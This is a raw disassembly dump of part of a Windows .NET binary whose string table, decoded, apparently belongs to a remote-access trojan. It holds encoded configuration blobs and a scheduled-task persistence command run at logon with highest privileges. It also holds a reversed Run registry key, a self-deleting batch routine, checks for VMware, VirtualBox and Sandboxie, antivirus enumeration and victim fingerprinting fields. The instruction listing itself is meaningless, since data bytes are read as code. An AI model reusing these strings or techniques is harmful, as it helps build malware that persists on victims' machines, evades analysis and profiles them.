  40b5f9:	00 5a 00             	add    %bl,0x0(%edx)
  40b5fc:	59                   	pop    %ecx
  40b5fd:	00 2f                	add    %ch,(%edi)
  40b5ff:	00 5a 00             	add    %bl,0x0(%edx)
  40b602:	4c                   	dec    %esp
  40b603:	00 68 00             	add    %ch,0x0(%eax)
  40b606:	56                   	push   %esi
  40b607:	00 49 00             	add    %cl,0x0(%ecx)
  40b60a:	77 00                	ja     0x40b60c
  40b60c:	2f                   	das
  40b60d:	00 31                	add    %dh,(%ecx)
  40b60f:	00 57 00             	add    %dl,0x0(%edi)
  40b612:	4b                   	dec    %ebx
  40b613:	00 66 00             	add    %ah,0x0(%esi)
  40b616:	77 00                	ja     0x40b618
  40b618:	4d                   	dec    %ebp
  40b619:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40b61d:	00 58 00             	add    %bl,0x0(%eax)
  40b620:	54                   	push   %esp
  40b621:	00 67 00             	add    %ah,0x0(%edi)
  40b624:	34 00                	xor    $0x0,%al
  40b626:	4c                   	dec    %esp
  40b627:	00 7a 00             	add    %bh,0x0(%edx)
  40b62a:	70 00                	jo     0x40b62c
  40b62c:	50                   	push   %eax
  40b62d:	00 50 00             	add    %dl,0x0(%eax)
  40b630:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40b634:	6a 00                	push   $0x0
  40b636:	73 00                	jae    0x40b638
  40b638:	4c                   	dec    %esp
  40b639:	00 31                	add    %dh,(%ecx)
  40b63b:	00 75 00             	add    %dh,0x0(%ebp)
  40b63e:	31 00                	xor    %eax,(%eax)
  40b640:	73 00                	jae    0x40b642
  40b642:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40b646:	50                   	push   %eax
  40b647:	00 75 00             	add    %dh,0x0(%ebp)
  40b64a:	73 00                	jae    0x40b64c
  40b64c:	55                   	push   %ebp
  40b64d:	00 67 00             	add    %ah,0x0(%edi)
  40b650:	32 00                	xor    (%eax),%al
  40b652:	55                   	push   %ebp
  40b653:	00 4d 00             	add    %cl,0x0(%ebp)
  40b656:	30 00                	xor    %al,(%eax)
  40b658:	41                   	inc    %ecx
  40b659:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b65f:	03 33                	add    (%ebx),%esi
  40b661:	00 00                	add    %al,(%eax)
  40b663:	80 b1 44 00 71 00 77 	xorb   $0x77,0x710044(%ecx)
  40b66a:	00 2b                	add    %ch,(%ebx)
  40b66c:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40b670:	00 2b                	add    %ch,(%ebx)
  40b672:	00 66 00             	add    %ah,0x0(%esi)
  40b675:	61                   	popa
  40b676:	00 32                	add    %dh,(%edx)
  40b678:	00 4e 00             	add    %cl,0x0(%esi)
  40b67b:	51                   	push   %ecx
  40b67c:	00 33                	add    %dh,(%ebx)
  40b67e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b681:	43                   	inc    %ebx
  40b682:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40b686:	00 36                	add    %dh,(%esi)
  40b688:	00 72 00             	add    %dh,0x0(%edx)
  40b68b:	53                   	push   %ebx
  40b68c:	00 69 00             	add    %ch,0x0(%ecx)
  40b68f:	67 00 2f             	add    %ch,(%bx)
  40b692:	00 35 00 48 00 39    	add    %dh,0x39004800
  40b698:	00 41 00             	add    %al,0x0(%ecx)
  40b69b:	52                   	push   %edx
  40b69c:	00 46 00             	add    %al,0x0(%esi)
  40b69f:	4b                   	dec    %ebx
  40b6a0:	00 66 00             	add    %ah,0x0(%esi)
  40b6a3:	65 00 32             	add    %dh,%gs:(%edx)
  40b6a6:	00 56 00             	add    %dl,0x0(%esi)
  40b6a9:	75 00                	jne    0x40b6ab
  40b6ab:	6a 00                	push   $0x0
  40b6ad:	4e                   	dec    %esi
  40b6ae:	00 63 00             	add    %ah,0x0(%ebx)
  40b6b1:	63 00                	arpl   %eax,(%eax)
  40b6b3:	77 00                	ja     0x40b6b5
  40b6b5:	57                   	push   %edi
  40b6b6:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b6ba:	00 48 00             	add    %cl,0x0(%eax)
  40b6bd:	45                   	inc    %ebp
  40b6be:	00 77 00             	add    %dh,0x0(%edi)
  40b6c1:	33 00                	xor    (%eax),%eax
  40b6c3:	77 00                	ja     0x40b6c5
  40b6c5:	53                   	push   %ebx
  40b6c6:	00 32                	add    %dh,(%edx)
  40b6c8:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40b6cc:	00 59 00             	add    %bl,0x0(%ecx)
  40b6cf:	4e                   	dec    %esi
  40b6d0:	00 41 00             	add    %al,0x0(%ecx)
  40b6d3:	54                   	push   %esp
  40b6d4:	00 57 00             	add    %dl,0x0(%edi)
  40b6d7:	58                   	pop    %eax
  40b6d8:	00 45 00             	add    %al,0x0(%ebp)
  40b6db:	4c                   	dec    %esp
  40b6dc:	00 68 00             	add    %ch,0x0(%eax)
  40b6df:	57                   	push   %edi
  40b6e0:	00 59 00             	add    %bl,0x0(%ecx)
  40b6e3:	52                   	push   %edx
  40b6e4:	00 52 00             	add    %dl,0x0(%edx)
  40b6e7:	61                   	popa
  40b6e8:	00 77 00             	add    %dh,0x0(%edi)
  40b6eb:	77 00                	ja     0x40b6ed
  40b6ed:	66 00 64 00 4f       	data16 add %ah,0x4f(%eax,%eax,1)
  40b6f2:	00 63 00             	add    %ah,0x0(%ebx)
  40b6f5:	73 00                	jae    0x40b6f7
  40b6f7:	75 00                	jne    0x40b6f9
  40b6f9:	4c                   	dec    %esp
  40b6fa:	00 4f 00             	add    %cl,0x0(%edi)
  40b6fd:	64 00 38             	add    %bh,%fs:(%eax)
  40b700:	00 5a 00             	add    %bl,0x0(%edx)
  40b703:	38 00                	cmp    %al,(%eax)
  40b705:	33 00                	xor    (%eax),%eax
  40b707:	59                   	pop    %ecx
  40b708:	00 2b                	add    %ch,(%ebx)
  40b70a:	00 4c 00 79          	add    %cl,0x79(%eax,%eax,1)
  40b70e:	00 67 00             	add    %ah,0x0(%edi)
  40b711:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b716:	09 6e 00             	or     %ebp,0x0(%esi)
  40b719:	75 00                	jne    0x40b71b
  40b71b:	6c                   	insb   (%dx),%es:(%edi)
  40b71c:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b720:	01 00                	add    %eax,(%eax)
  40b722:	03 3a                	add    (%edx),%edi
  40b724:	00 00                	add    %al,(%eax)
  40b726:	0d 50 00 61 00       	or     $0x610050,%eax
  40b72b:	63 00                	arpl   %eax,(%eax)
  40b72d:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b730:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b734:	09 50 00             	or     %edx,0x0(%eax)
  40b737:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b73d:	00 0f                	add    %cl,(%edi)
  40b73f:	4d                   	dec    %ebp
  40b740:	00 65 00             	add    %ah,0x0(%ebp)
  40b743:	73 00                	jae    0x40b745
  40b745:	73 00                	jae    0x40b747
  40b747:	61                   	popa
  40b748:	00 67 00             	add    %ah,0x0(%edi)
  40b74b:	65 00 00             	add    %al,%gs:(%eax)
  40b74e:	07                   	pop    %es
  40b74f:	63 00                	arpl   %eax,(%eax)
  40b751:	6d                   	insl   (%dx),%es:(%edi)
  40b752:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b756:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b75c:	00 73 00             	add    %dh,0x0(%ebx)
  40b75f:	63 00                	arpl   %eax,(%eax)
  40b761:	68 00 74 00 61       	push   $0x61007400
  40b766:	00 73 00             	add    %dh,0x0(%ebx)
  40b769:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b76c:	00 20                	add    %ah,(%eax)
  40b76e:	00 2f                	add    %ch,(%edi)
  40b770:	00 63 00             	add    %ah,0x0(%ebx)
  40b773:	72 00                	jb     0x40b775
  40b775:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b779:	74 00                	je     0x40b77b
  40b77b:	65 00 20             	add    %ah,%gs:(%eax)
  40b77e:	00 2f                	add    %ch,(%edi)
  40b780:	00 66 00             	add    %ah,0x0(%esi)
  40b783:	20 00                	and    %al,(%eax)
  40b785:	2f                   	das
  40b786:	00 73 00             	add    %dh,0x0(%ebx)
  40b789:	63 00                	arpl   %eax,(%eax)
  40b78b:	20 00                	and    %al,(%eax)
  40b78d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b78e:	00 6e 00             	add    %ch,0x0(%esi)
  40b791:	6c                   	insb   (%dx),%es:(%edi)
  40b792:	00 6f 00             	add    %ch,0x0(%edi)
  40b795:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b799:	6e                   	outsb  %ds:(%esi),(%dx)
  40b79a:	00 20                	add    %ah,(%eax)
  40b79c:	00 2f                	add    %ch,(%edi)
  40b79e:	00 72 00             	add    %dh,0x0(%edx)
  40b7a1:	6c                   	insb   (%dx),%es:(%edi)
  40b7a2:	00 20                	add    %ah,(%eax)
  40b7a4:	00 68 00             	add    %ch,0x0(%eax)
  40b7a7:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7ad:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7b1:	74 00                	je     0x40b7b3
  40b7b3:	20 00                	and    %al,(%eax)
  40b7b5:	2f                   	das
  40b7b6:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b7ba:	00 20                	add    %ah,(%eax)
  40b7bc:	00 22                	add    %ah,(%edx)
  40b7be:	00 00                	add    %al,(%eax)
  40b7c0:	11 22                	adc    %esp,(%edx)
  40b7c2:	00 20                	add    %ah,(%eax)
  40b7c4:	00 2f                	add    %ch,(%edi)
  40b7c6:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b7ca:	00 20                	add    %ah,(%eax)
  40b7cc:	00 27                	add    %ah,(%edi)
  40b7ce:	00 22                	add    %ah,(%edx)
  40b7d0:	00 01                	add    %al,(%ecx)
  40b7d2:	13 22                	adc    (%edx),%esp
  40b7d4:	00 27                	add    %ah,(%edi)
  40b7d6:	00 20                	add    %ah,(%eax)
  40b7d8:	00 26                	add    %ah,(%esi)
  40b7da:	00 20                	add    %ah,(%eax)
  40b7dc:	00 65 00             	add    %ah,0x0(%ebp)
  40b7df:	78 00                	js     0x40b7e1
  40b7e1:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b7e7:	5c                   	pop    %esp
  40b7e8:	00 6e 00             	add    %ch,0x0(%esi)
  40b7eb:	75 00                	jne    0x40b7ed
  40b7ed:	52                   	push   %edx
  40b7ee:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b7f2:	00 6f 00             	add    %ch,0x0(%edi)
  40b7f5:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b7fb:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b7ff:	74 00                	je     0x40b801
  40b801:	6e                   	outsb  %ds:(%esi),(%dx)
  40b802:	00 65 00             	add    %ah,0x0(%ebp)
  40b805:	72 00                	jb     0x40b807
  40b807:	72 00                	jb     0x40b809
  40b809:	75 00                	jne    0x40b80b
  40b80b:	43                   	inc    %ebx
  40b80c:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b810:	00 77 00             	add    %dh,0x0(%edi)
  40b813:	6f                   	outsl  %ds:(%esi),(%dx)
  40b814:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b818:	00 69 00             	add    %ch,0x0(%ecx)
  40b81b:	57                   	push   %edi
  40b81c:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b820:	00 66 00             	add    %ah,0x0(%esi)
  40b823:	6f                   	outsl  %ds:(%esi),(%dx)
  40b824:	00 73 00             	add    %dh,0x0(%ebx)
  40b827:	6f                   	outsl  %ds:(%esi),(%dx)
  40b828:	00 72 00             	add    %dh,0x0(%edx)
  40b82b:	63 00                	arpl   %eax,(%eax)
  40b82d:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b833:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b837:	61                   	popa
  40b838:	00 77 00             	add    %dh,0x0(%edi)
  40b83b:	74 00                	je     0x40b83d
  40b83d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b841:	53                   	push   %ebx
  40b842:	00 00                	add    %al,(%eax)
  40b844:	03 22                	add    (%edx),%esp
  40b846:	00 00                	add    %al,(%eax)
  40b848:	09 2e                	or     %ebp,(%esi)
  40b84a:	00 62 00             	add    %ah,0x0(%edx)
  40b84d:	61                   	popa
  40b84e:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b852:	13 40 00             	adc    0x0(%eax),%eax
  40b855:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b859:	68 00 6f 00 20       	push   $0x20006f00
  40b85e:	00 6f 00             	add    %ch,0x0(%edi)
  40b861:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b865:	00 1f                	add    %bl,(%edi)
  40b867:	74 00                	je     0x40b869
  40b869:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b86f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b870:	00 75 00             	add    %dh,0x0(%ebp)
  40b873:	74 00                	je     0x40b875
  40b875:	20 00                	and    %al,(%eax)
  40b877:	33 00                	xor    (%eax),%eax
  40b879:	20 00                	and    %al,(%eax)
  40b87b:	3e 00 20             	add    %ah,%ds:(%eax)
  40b87e:	00 4e 00             	add    %cl,0x0(%esi)
  40b881:	55                   	push   %ebp
  40b882:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b886:	15 53 00 54 00       	adc    $0x540053,%eax
  40b88b:	41                   	inc    %ecx
  40b88c:	00 52 00             	add    %dl,0x0(%edx)
  40b88f:	54                   	push   %esp
  40b890:	00 20                	add    %ah,(%eax)
  40b892:	00 22                	add    %ah,(%edx)
  40b894:	00 22                	add    %ah,(%edx)
  40b896:	00 20                	add    %ah,(%eax)
  40b898:	00 22                	add    %ah,(%edx)
  40b89a:	00 00                	add    %al,(%eax)
  40b89c:	07                   	pop    %es
  40b89d:	43                   	inc    %ebx
  40b89e:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b8a2:	00 00                	add    %al,(%eax)
  40b8a4:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b8a8:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b8ac:	00 22                	add    %ah,(%edx)
  40b8ae:	00 00                	add    %al,(%eax)
  40b8b0:	0f 22 00             	mov    %eax,%cr0
  40b8b3:	20 00                	and    %al,(%eax)
  40b8b5:	2f                   	das
  40b8b6:	00 66 00             	add    %ah,0x0(%esi)
  40b8b9:	20 00                	and    %al,(%eax)
  40b8bb:	2f                   	das
  40b8bc:	00 71 00             	add    %dh,0x0(%ecx)
  40b8bf:	00 05 78 00 70 00    	add    %al,0x700078
  40b8c5:	00 45 53             	add    %al,0x53(%ebp)
  40b8c8:	00 65 00             	add    %ah,0x0(%ebp)
  40b8cb:	6c                   	insb   (%dx),%es:(%edi)
  40b8cc:	00 65 00             	add    %ah,0x0(%ebp)
  40b8cf:	63 00                	arpl   %eax,(%eax)
  40b8d1:	74 00                	je     0x40b8d3
  40b8d3:	20 00                	and    %al,(%eax)
  40b8d5:	2a 00                	sub    (%eax),%al
  40b8d7:	20 00                	and    %al,(%eax)
  40b8d9:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b8dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8de:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8e1:	20 00                	and    %al,(%eax)
  40b8e3:	57                   	push   %edi
  40b8e4:	00 69 00             	add    %ch,0x0(%ecx)
  40b8e7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8e8:	00 33                	add    %dh,(%ebx)
  40b8ea:	00 32                	add    %dh,(%edx)
  40b8ec:	00 5f 00             	add    %bl,0x0(%edi)
  40b8ef:	43                   	inc    %ebx
  40b8f0:	00 6f 00             	add    %ch,0x0(%edi)
  40b8f3:	6d                   	insl   (%dx),%es:(%edi)
  40b8f4:	00 70 00             	add    %dh,0x0(%eax)
  40b8f7:	75 00                	jne    0x40b8f9
  40b8f9:	74 00                	je     0x40b8fb
  40b8fb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8ff:	53                   	push   %ebx
  40b900:	00 79 00             	add    %bh,0x0(%ecx)
  40b903:	73 00                	jae    0x40b905
  40b905:	74 00                	je     0x40b907
  40b907:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b90b:	00 19                	add    %bl,(%ecx)
  40b90d:	4d                   	dec    %ebp
  40b90e:	00 61 00             	add    %ah,0x0(%ecx)
  40b911:	6e                   	outsb  %ds:(%esi),(%dx)
  40b912:	00 75 00             	add    %dh,0x0(%ebp)
  40b915:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b919:	63 00                	arpl   %eax,(%eax)
  40b91b:	74 00                	je     0x40b91d
  40b91d:	75 00                	jne    0x40b91f
  40b91f:	72 00                	jb     0x40b921
  40b921:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b925:	00 2b                	add    %ch,(%ebx)
  40b927:	6d                   	insl   (%dx),%es:(%edi)
  40b928:	00 69 00             	add    %ch,0x0(%ecx)
  40b92b:	63 00                	arpl   %eax,(%eax)
  40b92d:	72 00                	jb     0x40b92f
  40b92f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b930:	00 73 00             	add    %dh,0x0(%ebx)
  40b933:	6f                   	outsl  %ds:(%esi),(%dx)
  40b934:	00 66 00             	add    %ah,0x0(%esi)
  40b937:	74 00                	je     0x40b939
  40b939:	20 00                	and    %al,(%eax)
  40b93b:	63 00                	arpl   %eax,(%eax)
  40b93d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b93e:	00 72 00             	add    %dh,0x0(%edx)
  40b941:	70 00                	jo     0x40b943
  40b943:	6f                   	outsl  %ds:(%esi),(%dx)
  40b944:	00 72 00             	add    %dh,0x0(%edx)
  40b947:	61                   	popa
  40b948:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b94c:	00 6f 00             	add    %ch,0x0(%edi)
  40b94f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b950:	00 00                	add    %al,(%eax)
  40b952:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b955:	6f                   	outsl  %ds:(%esi),(%dx)
  40b956:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b95a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b95e:	0f 56 00             	orps   (%eax),%xmm0
  40b961:	49                   	dec    %ecx
  40b962:	00 52 00             	add    %dl,0x0(%edx)
  40b965:	54                   	push   %esp
  40b966:	00 55 00             	add    %dl,0x0(%ebp)
  40b969:	41                   	inc    %ecx
  40b96a:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b96e:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b973:	77 00                	ja     0x40b975
  40b975:	61                   	popa
  40b976:	00 72 00             	add    %dh,0x0(%edx)
  40b979:	65 00 00             	add    %al,%gs:(%eax)
  40b97c:	15 56 00 69 00       	adc    $0x690056,%eax
  40b981:	72 00                	jb     0x40b983
  40b983:	74 00                	je     0x40b985
  40b985:	75 00                	jne    0x40b987
  40b987:	61                   	popa
  40b988:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b98c:	00 6f 00             	add    %ch,0x0(%edi)
  40b98f:	78 00                	js     0x40b991
  40b991:	00 17                	add    %dl,(%edi)
  40b993:	53                   	push   %ebx
  40b994:	00 62 00             	add    %ah,0x0(%edx)
  40b997:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b99d:	6c                   	insb   (%dx),%es:(%edi)
  40b99e:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b9a2:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b9a6:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9aa:	11 45 00             	adc    %eax,0x0(%ebp)
  40b9ad:	72 00                	jb     0x40b9af
  40b9af:	72 00                	jb     0x40b9b1
  40b9b1:	20 00                	and    %al,(%eax)
  40b9b3:	48                   	dec    %eax
  40b9b4:	00 57 00             	add    %dl,0x0(%edi)
  40b9b7:	49                   	dec    %ecx
  40b9b8:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9bc:	05 78 00 32 00       	add    $0x320078,%eax
  40b9c1:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b9c7:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b9cd:	74 00                	je     0x40b9cf
  40b9cf:	49                   	dec    %ecx
  40b9d0:	00 6e 00             	add    %ch,0x0(%esi)
  40b9d3:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b9d7:	00 09                	add    %cl,(%ecx)
  40b9d9:	48                   	dec    %eax
  40b9da:	00 57 00             	add    %dl,0x0(%edi)
  40b9dd:	49                   	dec    %ecx
  40b9de:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9e2:	09 55 00             	or     %edx,0x0(%ebp)
  40b9e5:	73 00                	jae    0x40b9e7
  40b9e7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9eb:	00 05 4f 00 53 00    	add    %al,0x53004f
  40b9f1:	00 13                	add    %dl,(%ebx)
  40b9f3:	4d                   	dec    %ebp
  40b9f4:	00 69 00             	add    %ch,0x0(%ecx)
  40b9f7:	63 00                	arpl   %eax,(%eax)
  40b9f9:	72 00                	jb     0x40b9fb
  40b9fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9fc:	00 73 00             	add    %dh,0x0(%ebx)
  40b9ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba00:	00 66 00             	add    %ah,0x0(%esi)
  40ba03:	74 00                	je     0x40ba05
  40ba05:	00 03                	add    %al,(%ebx)
  40ba07:	20 00                	and    %al,(%eax)
  40ba09:	00 09                	add    %cl,(%ecx)
  40ba0b:	54                   	push   %esp
  40ba0c:	00 72 00             	add    %dh,0x0(%edx)
  40ba0f:	75 00                	jne    0x40ba11
  40ba11:	65 00 00             	add    %al,%gs:(%eax)
  40ba14:	0b 36                	or     (%esi),%esi
  40ba16:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba19:	62 00                	bound  %eax,(%eax)
  40ba1b:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba21:	46                   	inc    %esi
  40ba22:	00 61 00             	add    %ah,0x0(%ecx)
  40ba25:	6c                   	insb   (%dx),%es:(%edi)
  40ba26:	00 73 00             	add    %dh,0x0(%ebx)
  40ba29:	65 00 00             	add    %al,%gs:(%eax)
  40ba2c:	0b 33                	or     (%ebx),%esi
  40ba2e:	00 32                	add    %dh,(%edx)
  40ba30:	00 62 00             	add    %ah,0x0(%edx)
  40ba33:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba39:	50                   	push   %eax
  40ba3a:	00 61 00             	add    %ah,0x0(%ecx)
  40ba3d:	74 00                	je     0x40ba3f
  40ba3f:	68 00 00 0f 56       	push   $0x560f0000
  40ba44:	00 65 00             	add    %ah,0x0(%ebp)
  40ba47:	72 00                	jb     0x40ba49
  40ba49:	73 00                	jae    0x40ba4b
  40ba4b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba51:	00 0b                	add    %cl,(%ebx)
  40ba53:	41                   	inc    %ecx
  40ba54:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba58:	00 69 00             	add    %ch,0x0(%ecx)
  40ba5b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba5c:	00 00                	add    %al,(%eax)
  40ba5e:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba62:	00 75 00             	add    %dh,0x0(%ebp)
  40ba65:	65 00 00             	add    %al,%gs:(%eax)
  40ba68:	0b 66 00             	or     0x0(%esi),%esp
  40ba6b:	61                   	popa
  40ba6c:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba70:	00 65 00             	add    %ah,0x0(%ebp)
  40ba73:	00 17                	add    %dl,(%edi)
  40ba75:	50                   	push   %eax
  40ba76:	00 65 00             	add    %ah,0x0(%ebp)
  40ba79:	72 00                	jb     0x40ba7b
  40ba7b:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba7f:	72 00                	jb     0x40ba81
  40ba81:	6d                   	insl   (%dx),%es:(%edi)
  40ba82:	00 61 00             	add    %ah,0x0(%ecx)
  40ba85:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba86:	00 63 00             	add    %ah,0x0(%ebx)
  40ba89:	65 00 00             	add    %al,%gs:(%eax)
  40ba8c:	11 50 00             	adc    %edx,0x0(%eax)
  40ba8f:	61                   	popa
  40ba90:	00 73 00             	add    %dh,0x0(%ebx)
  40ba93:	74 00                	je     0x40ba95
  40ba95:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40ba99:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40ba9f:	41                   	inc    %ecx
  40baa0:	00 6e 00             	add    %ch,0x0(%esi)
  40baa3:	74 00                	je     0x40baa5
  40baa5:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40baab:	72 00                	jb     0x40baad
  40baad:	75 00                	jne    0x40baaf
  40baaf:	73 00                	jae    0x40bab1
  40bab1:	00 13                	add    %dl,(%ebx)
  40bab3:	49                   	dec    %ecx
  40bab4:	00 6e 00             	add    %ch,0x0(%esi)
  40bab7:	73 00                	jae    0x40bab9
  40bab9:	74 00                	je     0x40babb
  40babb:	61                   	popa
  40babc:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bac0:	00 65 00             	add    %ah,0x0(%ebp)
  40bac3:	64 00 00             	add    %al,%fs:(%eax)
  40bac6:	09 50 00             	or     %edx,0x0(%eax)
  40bac9:	6f                   	outsl  %ds:(%esi),(%dx)
  40baca:	00 6e 00             	add    %ch,0x0(%esi)
  40bacd:	67 00 00             	add    %al,(%bx,%si)
  40bad0:	0b 47 00             	or     0x0(%edi),%eax
  40bad3:	72 00                	jb     0x40bad5
  40bad5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bad6:	00 75 00             	add    %dh,0x0(%ebp)
  40bad9:	70 00                	jo     0x40badb
  40badb:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bae1:	00 2b                	add    %ch,(%ebx)
  40bae3:	5c                   	pop    %esp
  40bae4:	00 72 00             	add    %dh,0x0(%edx)
  40bae7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bae8:	00 6f 00             	add    %ch,0x0(%edi)
  40baeb:	74 00                	je     0x40baed
  40baed:	5c                   	pop    %esp
  40baee:	00 53 00             	add    %dl,0x0(%ebx)
  40baf1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40baf5:	75 00                	jne    0x40baf7
  40baf7:	72 00                	jb     0x40baf9
  40baf9:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40baff:	43                   	inc    %ebx
  40bb00:	00 65 00             	add    %ah,0x0(%ebp)
  40bb03:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb04:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb08:	00 72 00             	add    %dh,0x0(%edx)
  40bb0b:	32 00                	xor    (%eax),%al
  40bb0d:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb13:	6c                   	insb   (%dx),%es:(%edi)
  40bb14:	00 65 00             	add    %ah,0x0(%ebp)
  40bb17:	63 00                	arpl   %eax,(%eax)
  40bb19:	74 00                	je     0x40bb1b
  40bb1b:	20 00                	and    %al,(%eax)
  40bb1d:	2a 00                	sub    (%eax),%al
  40bb1f:	20 00                	and    %al,(%eax)
  40bb21:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb25:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb26:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb29:	20 00                	and    %al,(%eax)
  40bb2b:	41                   	inc    %ecx
  40bb2c:	00 6e 00             	add    %ch,0x0(%esi)
  40bb2f:	74 00                	je     0x40bb31
  40bb31:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb37:	72 00                	jb     0x40bb39
  40bb39:	75 00                	jne    0x40bb3b
  40bb3b:	73 00                	jae    0x40bb3d
  40bb3d:	50                   	push   %eax
  40bb3e:	00 72 00             	add    %dh,0x0(%edx)
  40bb41:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb42:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb46:	00 63 00             	add    %ah,0x0(%ebx)
  40bb49:	74 00                	je     0x40bb4b
  40bb4b:	00 17                	add    %dl,(%edi)
  40bb4d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb51:	73 00                	jae    0x40bb53
  40bb53:	70 00                	jo     0x40bb55
  40bb55:	6c                   	insb   (%dx),%es:(%edi)
  40bb56:	00 61 00             	add    %ah,0x0(%ecx)
  40bb59:	79 00                	jns    0x40bb5b
  40bb5b:	4e                   	dec    %esi
  40bb5c:	00 61 00             	add    %ah,0x0(%ecx)
  40bb5f:	6d                   	insl   (%dx),%es:(%edi)
  40bb60:	00 65 00             	add    %ah,0x0(%ebp)
  40bb63:	00 07                	add    %al,(%edi)
  40bb65:	4e                   	dec    %esi
  40bb66:	00 2f                	add    %ch,(%edi)
